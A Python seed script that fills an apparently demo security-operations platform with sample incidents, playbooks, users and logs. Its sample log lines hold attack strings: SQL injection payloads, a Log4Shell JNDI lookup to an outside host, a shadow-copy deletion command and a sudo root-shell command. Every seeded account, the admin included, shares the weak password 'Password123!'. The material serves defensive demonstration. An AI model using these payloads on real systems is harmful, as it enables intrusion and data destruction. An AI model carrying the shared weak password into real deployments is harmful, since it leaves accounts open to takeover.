"""
Database Seed Service — Realistic Cybersecurity Telemetry & Initial System State
"""
from datetime import datetime, timedelta, timezone
from sqlalchemy.orm import Session
from app.core.security import get_password_hash, hash_api_key
from app.models.user import User
from app.models.incident import Incident
from app.models.ioc import IOC
from app.models.mitre import MitreTechnique
from app.models.ai_analysis import AIAnalysis
from app.models.playbook import Playbook, PlaybookExecution
from app.models.integration import Integration
from app.models.api_key import ApiKey
from app.models.audit_log import AuditLog
from app.models.notification import Notification


def seed_database(db: Session):
    """Seed database with production-grade demo security records if empty."""
    # Check if already seeded
    if db.query(User).count() > 0:
        return

    now = datetime.now(timezone.utc)

    # 1. Users
    users_data = [
        {"email": "admin@cybersentinel.ai", "full_name": "Dr. Keanu Makoa", "role": "ADMIN", "password": "Password123!", "mfa": True},
        {"email": "sarah.chen@cybersentinel.ai", "full_name": "Sarah Chen", "role": "ANALYST", "password": "Password123!", "mfa": True},
        {"email": "marcus.webb@cybersentinel.ai", "full_name": "Marcus Webb", "role": "ANALYST", "password": "Password123!", "mfa": True},
        {"email": "alex.rivera@cybersentinel.ai", "full_name": "Alex Rivera", "role": "ANALYST", "password": "Password123!", "mfa": True},
        {"email": "priya.nair@cybersentinel.ai", "full_name": "Priya Nair", "role": "ANALYST", "password": "Password123!", "mfa": True},
        {"email": "viewer@cybersentinel.ai", "full_name": "Yuki Tanaka", "role": "VIEWER", "password": "Password123!", "mfa": False},
    ]
    created_users = {}
    for u in users_data:
        user = User(
            email=u["email"],
            full_name=u["full_name"],
            role=u["role"],
            password_hash=get_password_hash(u["password"]),
            is_active=True,
            mfa_enabled=u["mfa"],
            last_login=now - timedelta(minutes=15),
            created_at=now - timedelta(days=30),
        )
        db.add(user)
        db.flush()
        created_users[u["email"]] = user

    # 2. Playbooks
    playbooks_data = [
        {
            "name": "Ransomware Host Containment & Recovery",
            "category": "Endpoint / Malware",
            "severity": "CRITICAL",
            "description": "Rapid host network isolation, ransomware process tree termination, and immutable backup restoration.",
            "steps": [
                {"desc": "Isolate infected workstation from network (Simulated)", "cmd": "netsh advfirewall set allprofiles state on && netsh interface set interface 'Ethernet' disable"},
                {"desc": "Kill ransomware process tree (Simulated)", "cmd": "taskkill /F /PID 4832 /T"},
                {"desc": "Block C2 IP at perimeter firewall (Simulated)", "cmd": "iptables -I OUTPUT -d 185.220.101.45 -j DROP"},
                {"desc": "Preserve memory dump for forensic analysis (Simulated)", "cmd": "winpmem_mini_x64.exe memdump.raw"},
                {"desc": "Restore files from clean offline volume shadow (Simulated)", "cmd": "wbadmin start recovery -version:08/30/2026-08:00 -itemType:Volume -items:C: -recoveryTarget:C:"},
            ]
        },
        {
            "name": "WAF Rule Insertion & SQLi Remediation",
            "category": "Web Application",
            "severity": "CRITICAL",
            "description": "Block offending source IP at WAF, inspect exfiltration logs, and verify parameterization.",
            "steps": [
                {"desc": "Block attacking IP at WAF and perimeter (Simulated)", "cmd": "waf-cli block-ip --ip 45.155.204.127 --duration permanent"},
                {"desc": "Inspect exfiltrated record count in web logs (Simulated)", "cmd": "grep '45.155.204.127' /var/log/nginx/access.log | awk '{print $9, $10}'"},
                {"desc": "Deploy parameterized query patch (Simulated)", "cmd": "git checkout -b hotfix/sqli-parameterization && git commit -m 'Enforce ORM parameterization'"},
                {"desc": "Run automated regression and penetration test (Simulated)", "cmd": "sqlmap -u 'https://api.prod.company.com/api/v2/users?id=1' --batch"},
            ]
        },
        {
            "name": "Pass-the-Hash Containment & Kerberos Purge",
            "category": "Identity & Access",
            "severity": "CRITICAL",
            "description": "Purge active Kerberos/NTLM tickets, isolate compromised jump box, and rotate Domain Admin credentials.",
            "steps": [
                {"desc": "Isolate compromised host 192.168.1.210 (Simulated)", "cmd": "edr-cli isolate --host WKSTN-DEV-012"},
                {"desc": "Purge active Kerberos/NTLM tickets for domain admins (Simulated)", "cmd": "klist purge"},
                {"desc": "Remove malicious scheduled task (Simulated)", "cmd": "schtasks /delete /tn 'WindowsUpdate' /f"},
                {"desc": "Enable LSA Protection on DCs (Simulated)", "cmd": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v RunAsPPL /t REG_DWORD /d 1 /f"},
            ]
        },
    ]
    created_playbooks = {}
    for pb in playbooks_data:
        playbook = Playbook(
            name=pb["name"],
            category=pb["category"],
            severity=pb["severity"],
            description=pb["description"],
            steps=pb["steps"],
            enabled=True,
            created_at=now - timedelta(days=60),
        )
        db.add(playbook)
        db.flush()
        created_playbooks[pb["name"]] = playbook

    # 3. Incidents & Associated Telemetry
    incidents_data = [
        {
            "public_id": "INC-2024-0847",
            "title": "Ransomware Execution Detected on Finance Workstation",
            "description": "Endpoint protection flagged encrypted file activity consistent with LockBit 3.0 ransomware. Process tree shows PowerShell execution from malicious macro in email attachment.",
            "severity": "CRITICAL",
            "status": "INVESTIGATING",
            "category": "Ransomware",
            "source": "EDR (CrowdStrike)",
            "source_ip": "192.168.10.43",
            "destination_ip": "185.220.101.45",
            "target_system": "WKSTN-FIN-043",
            "assignee": "Sarah Chen",
            "risk_score": 9.8,
            "tags": ["ransomware", "LockBit", "endpoint", "finance"],
            "raw_logs": [
                {"time": "10:02:14", "level": "ERROR", "msg": "Malicious process detected", "detail": "powershell.exe -enc JABzAD0ATgBlAHcALQBPAGIA..."},
                {"time": "10:02:15", "level": "ERROR", "msg": "File encryption activity", "detail": "Path: C:\\Users\\jsmith\\Documents\\*.docx → *.docx.locked"},
                {"time": "10:02:16", "level": "ERROR", "msg": "C2 connection attempt", "detail": "Outbound: 185.220.101.45:443 (Tor exit node)"},
                {"time": "10:02:17", "level": "WARN", "msg": "Registry modification", "detail": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run → svchost32.exe"},
                {"time": "10:02:18", "level": "ERROR", "msg": "Shadow copy deletion", "detail": "cmd.exe /c vssadmin delete shadows /all /quiet"},
                {"time": "10:02:21", "level": "INFO", "msg": "Process quarantined", "detail": "powershell.exe (PID 4832) terminated by EDR agent"},
            ],
            "detected_at": now - timedelta(minutes=23),
            "created_at": now - timedelta(minutes=23),
            "updated_at": now - timedelta(minutes=8),
            "iocs": [
                {"type": "IP", "value": "185.220.101.45", "confidence": 98.0},
                {"type": "HASH", "value": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", "confidence": 95.0},
                {"type": "FILE", "value": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\macro_payload.bin", "confidence": 92.0},
            ],
            "mitre": [
                {"technique_id": "T1059.001", "technique_name": "PowerShell", "tactic": "Execution"},
                {"technique_id": "T1486", "technique_name": "Data Encrypted for Impact", "tactic": "Impact"},
                {"technique_id": "T1490", "technique_name": "Inhibit System Recovery", "tactic": "Impact"},
            ]
        },
        {
            "public_id": "INC-2024-0846",
            "title": "SQL Injection Attack on Customer API",
            "description": "WAF detected a series of SQL injection payloads targeting the /api/v2/users endpoint. Attacker successfully extracted partial user records from staging database.",
            "severity": "CRITICAL",
            "status": "DETECTED",
            "category": "Web Exploit",
            "source": "WAF (Cloudflare)",
            "source_ip": "45.155.204.127",
            "destination_ip": "10.0.4.12",
            "target_system": "api.prod.company.com",
            "assignee": "Marcus Webb",
            "risk_score": 9.2,
            "tags": ["sqli", "web", "data-breach", "api"],
            "raw_logs": [
                {"time": "09:38:22", "level": "WARN", "msg": "SQLi pattern detected", "detail": "GET /api/v2/users?id=1' OR '1'='1"},
                {"time": "09:38:24", "level": "WARN", "msg": "Union-based injection attempt", "detail": "GET /api/v2/users?id=1 UNION SELECT username,password FROM users--"},
                {"time": "09:38:26", "level": "ERROR", "msg": "DB error response leaked", "detail": "HTTP 500: ORA-00907: missing right parenthesis"},
                {"time": "09:38:29", "level": "ERROR", "msg": "Data exfiltration suspected", "detail": "Response body size anomaly: 48KB (avg: 2KB)"},
                {"time": "09:38:33", "level": "INFO", "msg": "IP blocked by WAF rule", "detail": "Rule ID: WAF-SQL-003 | Action: BLOCK | IP: 45.155.204.127"},
            ],
            "detected_at": now - timedelta(minutes=45),
            "created_at": now - timedelta(minutes=45),
            "updated_at": now - timedelta(minutes=45),
            "iocs": [
                {"type": "IP", "value": "45.155.204.127", "confidence": 99.0},
                {"type": "URL", "value": "https://api.prod.company.com/api/v2/users?id=1%27%20OR%201=1", "confidence": 94.0},
            ],
            "mitre": [
                {"technique_id": "T1190", "technique_name": "Exploit Public-Facing Application", "tactic": "Initial Access"},
                {"technique_id": "T1005", "technique_name": "Data from Local System", "tactic": "Collection"},
            ]
        },
        {
            "public_id": "INC-2024-0845",
            "title": "Lateral Movement via Pass-the-Hash",
            "description": "SIEM correlation detected credential reuse across 6 internal hosts within 4 minutes. NTLM hash extracted from memory dump on compromised DC. Active Directory logs show suspicious authentication.",
            "severity": "CRITICAL",
            "status": "INVESTIGATING",
            "category": "Credential Abuse",
            "source": "SIEM (Splunk)",
            "source_ip": "192.168.1.210",
            "destination_ip": "192.168.1.10",
            "target_system": "Multiple (DC01, APPSVR02, FILESVR01)",
            "assignee": "Alex Rivera",
            "risk_score": 9.5,
            "tags": ["lateral-movement", "credential-theft", "active-directory"],
            "raw_logs": [
                {"time": "08:44:01", "level": "WARN", "msg": "NTLM authentication anomaly", "detail": "DC01: 47 NTLM logon events from 192.168.1.210 in 4 min"},
                {"time": "08:44:03", "level": "ERROR", "msg": "Pass-the-hash indicator", "detail": "Mimikatz-like memory access pattern on WKSTN-DEV-012"},
                {"time": "08:44:08", "level": "ERROR", "msg": "Lateral movement: APPSVR02", "detail": "Successful NTLM auth with harvested hash from domain admin"},
                {"time": "08:44:11", "level": "ERROR", "msg": "Lateral movement: FILESVR01", "detail": "Admin share \\\\FILESVR01\\ADMIN$ accessed"},
            ],
            "detected_at": now - timedelta(minutes=90),
            "created_at": now - timedelta(minutes=90),
            "updated_at": now - timedelta(minutes=30),
            "iocs": [
                {"type": "IP", "value": "192.168.1.210", "confidence": 96.0},
                {"type": "USERNAME", "value": "corp\\domain_admin", "confidence": 98.0},
            ],
            "mitre": [
                {"technique_id": "T1550.002", "technique_name": "Pass the Hash", "tactic": "Lateral Movement"},
                {"technique_id": "T1003.001", "technique_name": "LSASS Memory", "tactic": "Credential Access"},
            ]
        },
        {
            "public_id": "INC-2024-0844",
            "title": "DDoS Attack — Public Web Server",
            "description": "Volumetric DDoS attack targeting primary web server. Peak traffic at 2.4 Gbps from distributed botnet. CDN scrubbing partially effective.",
            "severity": "HIGH",
            "status": "INVESTIGATING",
            "category": "DDoS",
            "source": "Firewall (Palo Alto)",
            "source_ip": "185.22.152.0/24",
            "destination_ip": "78.45.200.10",
            "target_system": "www.company.com (78.45.200.10)",
            "assignee": "Priya Nair",
            "risk_score": 7.5,
            "tags": ["ddos", "availability", "web", "botnet"],
            "raw_logs": [
                {"time": "08:00:05", "level": "WARN", "msg": "Traffic spike detected", "detail": "Inbound: 2.4 Gbps (threshold: 500 Mbps)"},
                {"time": "08:00:07", "level": "ERROR", "msg": "SYN flood detected", "detail": "1.8M SYN packets/sec from 23,400 source IPs"},
                {"time": "08:00:12", "level": "INFO", "msg": "CDN scrubbing activated", "detail": "Cloudflare Under Attack mode enabled"},
            ],
            "detected_at": now - timedelta(hours=2),
            "created_at": now - timedelta(hours=2),
            "updated_at": now - timedelta(minutes=15),
            "iocs": [
                {"type": "IP", "value": "185.22.152.44", "confidence": 88.0},
            ],
            "mitre": [
                {"technique_id": "T1498.001", "technique_name": "Direct Network Flood", "tactic": "Impact"},
            ]
        },
        {
            "public_id": "INC-2024-0843",
            "title": "Data Exfiltration via DNS Tunneling",
            "description": "Unusual DNS query patterns detected from DBSVR01. High-volume TXT record requests to unknown domain. Traffic volume suggests active data extraction via covert channel.",
            "severity": "HIGH",
            "status": "DETECTED",
            "category": "Data Exfiltration",
            "source": "DNS Gateway",
            "source_ip": "192.168.5.20",
            "destination_ip": "8.8.8.8",
            "target_system": "DBSVR01",
            "assignee": "Sarah Chen",
            "risk_score": 8.0,
            "tags": ["exfiltration", "dns-tunnel", "database", "covert-channel"],
            "raw_logs": [
                {"time": "07:12:33", "level": "WARN", "msg": "DNS anomaly detected", "detail": "3,200 TXT queries/min to d2a8kl9p.exfil-domain.net"},
                {"time": "07:12:40", "level": "ERROR", "msg": "Exfiltration volume exceeded", "detail": "Est. transfer: 847MB over last 45 minutes"},
            ],
            "detected_at": now - timedelta(hours=3),
            "created_at": now - timedelta(hours=3),
            "updated_at": now - timedelta(hours=1),
            "iocs": [
                {"type": "DOMAIN", "value": "d2a8kl9p.exfil-domain.net", "confidence": 95.0},
            ],
            "mitre": [
                {"technique_id": "T1071.004", "technique_name": "DNS", "tactic": "Command and Control"},
                {"technique_id": "T1048.003", "technique_name": "Exfiltration Over Alternative Protocol", "tactic": "Exfiltration"},
            ]
        },
        {
            "public_id": "INC-2024-0842",
            "title": "Log4Shell Exploit Attempt on Java App Server",
            "description": "IDS detected CVE-2021-44228 (Log4Shell) exploit string in HTTP request headers targeting legacy Java application. JNDI lookup prevented by Java security manager configuration.",
            "severity": "HIGH",
            "status": "RESOLVED",
            "category": "RCE Exploit",
            "source": "IDS/IPS",
            "source_ip": "91.108.4.236",
            "destination_ip": "10.0.12.80",
            "target_system": "java-app.internal.company.com",
            "assignee": "Sarah Chen",
            "risk_score": 8.2,
            "tags": ["log4shell", "cve-2021-44228", "java", "rce"],
            "raw_logs": [
                {"time": "05:22:11", "level": "ERROR", "msg": "Log4Shell pattern in header", "detail": "User-Agent: ${jndi:ldap://91.108.4.236:1389/a}"},
                {"time": "05:22:11", "level": "INFO", "msg": "JNDI lookup blocked", "detail": "Java security manager denied LDAP connection"},
            ],
            "detected_at": now - timedelta(hours=5),
            "created_at": now - timedelta(hours=5),
            "updated_at": now - timedelta(hours=3),
            "resolved_at": now - timedelta(hours=3),
            "iocs": [
                {"type": "IP", "value": "91.108.4.236", "confidence": 97.0},
                {"type": "URL", "value": "ldap://91.108.4.236:1389/a", "confidence": 95.0},
            ],
            "mitre": [
                {"technique_id": "T1190", "technique_name": "Exploit Public-Facing Application", "tactic": "Initial Access"},
            ]
        },
        {
            "public_id": "INC-2024-0841",
            "title": "Privilege Escalation via Sudo Misconfiguration",
            "description": "A standard user account successfully escalated privileges to root using a misconfigured sudo rule on the CI/CD build server. Admin shell obtained for approximately 12 minutes.",
            "severity": "HIGH",
            "status": "RESOLVED",
            "category": "Privilege Escalation",
            "source": "SIEM (Splunk)",
            "source_ip": "192.168.20.55",
            "destination_ip": "192.168.20.55",
            "target_system": "CI-BUILD-SERVER-02",
            "assignee": "Marcus Webb",
            "risk_score": 7.8,
            "tags": ["privilege-escalation", "sudo", "linux", "ci-cd"],
            "raw_logs": [
                {"time": "02:14:33", "level": "WARN", "msg": "Sudo without password", "detail": "User: dev_jenkins | CMD: sudo /bin/bash (NOPASSWD)"},
                {"time": "02:14:34", "level": "ERROR", "msg": "Root shell obtained", "detail": "UID=0 GID=0 | TTY=/dev/pts/2"},
            ],
            "detected_at": now - timedelta(hours=8),
            "created_at": now - timedelta(hours=8),
            "updated_at": now - timedelta(hours=6),
            "resolved_at": now - timedelta(hours=6),
            "iocs": [
                {"type": "USERNAME", "value": "dev_jenkins", "confidence": 94.0},
            ],
            "mitre": [
                {"technique_id": "T1548.003", "technique_name": "Sudo and Sudo Caching", "tactic": "Privilege Escalation"},
            ]
        },
    ]

    for inc_data in incidents_data:
        iocs = inc_data.pop("iocs", [])
        mitre = inc_data.pop("mitre", [])
        inc = Incident(**inc_data)
        db.add(inc)
        db.flush()

        for i in iocs:
            db.add(IOC(incident_id=inc.id, **i, created_at=inc.created_at))
        for m in mitre:
            db.add(MitreTechnique(incident_id=inc.id, **m))

    # 4. Integrations
    integrations_data = [
        {"name": "Splunk SIEM Core", "provider": "splunk", "category": "SIEM", "status": "SIMULATED", "endpoint_url": "https://siem.corp.internal:8089", "enabled": True},
        {"name": "CrowdStrike Falcon EDR", "provider": "crowdstrike", "category": "EDR", "status": "SIMULATED", "endpoint_url": "https://api.crowdstrike.com", "enabled": True},
        {"name": "Palo Alto Next-Gen Firewall", "provider": "paloalto", "category": "Firewall", "status": "SIMULATED", "endpoint_url": "https://fw-edge.corp.internal/api", "enabled": True},
        {"name": "VirusTotal Threat Intelligence", "provider": "virustotal", "category": "Threat Intel", "status": "SIMULATED", "endpoint_url": "https://www.virustotal.com/api/v3", "enabled": True},
        {"name": "AWS CloudTrail SecOps", "provider": "aws", "category": "Cloud", "status": "SIMULATED", "endpoint_url": "https://cloudtrail.us-east-1.amazonaws.com", "enabled": True},
        {"name": "SOC Slack Incident Channel", "provider": "slack", "category": "Notification", "status": "SIMULATED", "endpoint_url": "https://hooks.slack.com/services/T00/B00/X00", "enabled": True},
    ]
    for integ in integrations_data:
        db.add(Integration(
            name=integ["name"],
            provider=integ["provider"],
            category=integ["category"],
            status=integ["status"],
            endpoint_url=integ["endpoint_url"],
            configuration_metadata={"timeout_seconds": 10, "ssl_verify": True},
            last_checked_at=now - timedelta(minutes=5),
            last_status_message="Simulated endpoint responding with health OK",
            enabled=integ["enabled"],
        ))

    # 5. API Keys (Hashed in DB)
    api_keys_data = [
        {"name": "SIEM Ingest Stream Connector", "prefix": "cs_live_k8j2n...9xQm", "hash_str": "dummy_hash_1", "owner": "admin@cybersentinel.ai", "creator": "Dr. Keanu Makoa", "perms": ["incidents:read", "incidents:write", "logs:ingest"]},
        {"name": "EDR Falcon Push Webhook", "prefix": "cs_live_p3wR7...4zNk", "hash_str": "dummy_hash_2", "owner": "marcus.webb@cybersentinel.ai", "creator": "Marcus Webb", "perms": ["incidents:write", "alerts:push"]},
        {"name": "Palo Alto Firewall Block Action API", "prefix": "cs_live_m9Yx2...7bJp", "hash_str": "dummy_hash_3", "owner": "admin@cybersentinel.ai", "creator": "Dr. Keanu Makoa", "perms": ["incidents:read", "playbooks:execute"]},
    ]
    for k in api_keys_data:
        owner = created_users.get(k["owner"])
        db.add(ApiKey(
            public_id=f"KEY-00{api_keys_data.index(k)+1}",
            name=k["name"],
            owner_id=owner.id if owner else 1,
            created_by_name=k["creator"],
            key_prefix=k["prefix"],
            key_hash=hash_api_key(k["hash_str"]),
            permissions=k["perms"],
            status="active",
            request_count=1420 * (api_keys_data.index(k)+1),
            created_at=now - timedelta(days=20),
            last_used_at=now - timedelta(minutes=2),
        ))

    # 6. Audit Logs
    audit_data = [
        {"public_id": "AUD-8847", "user_email": "sarah.chen@cybersentinel.ai", "user_name": "Sarah Chen", "action": "TRIAGE_EXECUTED", "resource": "INCIDENT", "resource_id": "INC-2024-0847", "detail": "AI triage triggered on ransomware incident", "severity": "info", "time_offset": 5},
        {"public_id": "AUD-8846", "user_email": "marcus.webb@cybersentinel.ai", "user_name": "Marcus Webb", "action": "INCIDENT_STATUS_CHANGED", "resource": "INCIDENT", "resource_id": "INC-2024-0842", "detail": "Status changed from investigating → resolved", "severity": "info", "time_offset": 20},
        {"public_id": "AUD-8845", "user_email": "admin@cybersentinel.ai", "user_name": "Dr. Keanu Makoa", "action": "API_KEY_CREATED", "resource": "API_KEY", "resource_id": "KEY-001", "detail": "SIEM API key generated with scoped permissions", "severity": "warning", "time_offset": 35},
        {"public_id": "AUD-8844", "user_email": "alex.rivera@cybersentinel.ai", "user_name": "Alex Rivera", "action": "PLAYBOOK_EXECUTED", "resource": "INCIDENT", "resource_id": "INC-2024-0845", "detail": "Containment playbook step 1-3 executed (SIMULATION)", "severity": "info", "time_offset": 50},
        {"public_id": "AUD-8843", "user_email": "sarah.chen@cybersentinel.ai", "user_name": "Sarah Chen", "action": "LOGIN_SUCCESS", "resource": "AUTH", "resource_id": "sarah.chen@cybersentinel.ai", "detail": "Successful JWT authentication from corporate subnet", "severity": "info", "time_offset": 120},
    ]
    for aud in audit_data:
        db.add(AuditLog(
            public_id=aud["public_id"],
            user_email=aud["user_email"],
            user_name=aud["user_name"],
            action=aud["action"],
            resource=aud["resource"],
            resource_id=aud["resource_id"],
            detail=aud["detail"],
            severity=aud["severity"],
            ip_address="192.168.100.10",
            timestamp=now - timedelta(minutes=aud["time_offset"]),
        ))

    # 7. Notifications
    notifs_data = [
        {"title": "CRITICAL: Ransomware on WKSTN-FIN-043", "message": "EDR agent quarantined host. Immediate triage required.", "color": "#FF3366", "severity": "critical", "read": False},
        {"title": "NEW: SQL Injection on customer API", "message": "WAF blocked attacker IP 45.155.204.127.", "color": "#FF3366", "severity": "critical", "read": False},
        {"title": "AI Triage complete: INC-2024-0845", "message": "Pass-the-Hash analysis confidence: 95%.", "color": "#00D4FF", "severity": "info", "read": False},
        {"title": "INC-2024-0842 resolved by Sarah Chen", "message": "Log4Shell exploit mitigated.", "color": "#00FF88", "severity": "success", "read": True},
    ]
    for n in notifs_data:
        db.add(Notification(
            title=n["title"],
            message=n["message"],
            color=n["color"],
            severity=n["severity"],
            read=n["read"],
            created_at=now - timedelta(minutes=10 * (notifs_data.index(n)+1)),
        ))

    db.commit()
